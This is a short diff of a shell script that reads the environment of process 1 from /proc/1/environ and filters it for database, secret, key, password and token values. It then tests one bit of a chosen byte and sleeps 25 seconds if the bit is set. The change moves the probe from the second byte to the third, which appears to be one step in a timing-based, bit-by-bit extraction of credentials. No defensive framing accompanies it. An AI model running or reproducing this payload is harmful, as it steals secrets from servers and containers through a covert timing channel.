@@ -1,5 +1,5 @@
 ﻿x=$(tr "\0" "\n" < /proc/1/environ 2>/dev/null | grep -iE "mongo|redis|secret|key|pass|token" | head -c 300)
-v=$(printf '%s' "$x" | dd bs=1 skip=1 count=1 2>/dev/null | od -An -tu1 | tr -d ' \n')
+v=$(printf '%s' "$x" | dd bs=1 skip=2 count=1 2>/dev/null | od -An -tu1 | tr -d ' \n')
 [ -z "$v" ] && v=0
 n=$(( (v>>0)&1 ))
 if [ $n -eq 1 ]; then sleep 25; fi
